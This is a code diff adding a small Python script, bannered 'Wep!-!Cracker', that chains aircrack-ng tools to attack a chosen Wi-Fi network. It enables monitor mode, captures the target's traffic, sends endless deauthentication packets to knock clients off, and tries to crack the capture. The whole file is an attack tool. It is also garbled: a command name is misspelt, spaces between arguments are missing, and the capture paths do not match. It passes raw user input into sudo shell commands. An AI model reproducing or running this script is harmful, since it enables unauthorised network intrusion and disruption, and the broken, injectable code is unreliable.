@@ -1,0 +1,12 @@
+import os 
+os.system("sudo apt-get install figlet")
+os.system("figlet Wep!-!Cracker ")
+wireless_cart = str(input("Wireless Cart - Example wlan0 : "))
+os.system("sudo airmon-ng start " + wireless_cart + "")
+os.system("sudo airodump-ng " + wireless_cart + "")
+bssid = str(input("Target BSSID : "))
+channel = input("Target Channel : ")
+os.system("sudo airmonn-ng -c " + channel + "--bssid" + bssid + "-w /root/Desktop " + wireless_cart + "")
+essid = str(input("Target Client ESSID : "))
+os.system("sudo aireplay-ng -0 0 -b " + bssid + "-e " + essid + " " + wireless_cart + "")
+os.system("sudo aircrack-ng /root/Desktop/-01.cap")
